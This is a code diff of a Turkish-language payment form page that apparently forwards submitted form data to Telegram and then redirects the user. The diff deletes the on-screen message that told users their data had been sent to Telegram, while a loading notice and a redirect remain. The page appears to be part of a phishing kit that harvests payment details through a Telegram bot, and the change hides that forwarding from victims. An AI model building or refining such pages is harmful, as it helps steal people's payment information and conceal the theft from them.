@@ -465,9 +465,6 @@ select:disabled {
           📤 Telegram'a gönderiliyor...
         </div>
         
-        <div class="success-message" id="successMessage">
-          ✅ Form başarıyla gönderildi ve Telegram'a iletildi!
-        </div>
         
         <button type="button" class="pay-button" onclick="validateAndSubmit()" id="submitButton">
           Kaydet ve ödemeye geç
@@ -654,7 +651,6 @@ select:disabled {
       const formGroups = document.querySelectorAll('.form-group');
       const submitButton = document.getElementById('submitButton');
       const loadingMessage = document.getElementById('loadingMessage');
-      const successMessage = document.getElementById('successMessage');
       let isValid = true;
       
       // Tüm hata mesajlarını temizle
@@ -700,7 +696,6 @@ select:disabled {
         submitButton.disabled = true;
         submitButton.textContent = 'Gönderiliyor...';
         loadingMessage.style.display = 'block';
-        successMessage.style.display = 'none';
         
         // Form verilerini topla
         const formData = new FormData(form);
@@ -715,8 +710,7 @@ select:disabled {
         submitButton.textContent = 'Kaydet ve ödemeye geç';
         
         if (telegramSuccess) {
-          // Başarı mesajını göster
-          successMessage.style.display = 'block';
+          
           
           // 2 saniye sonra yönlendir
           setTimeout(() => {
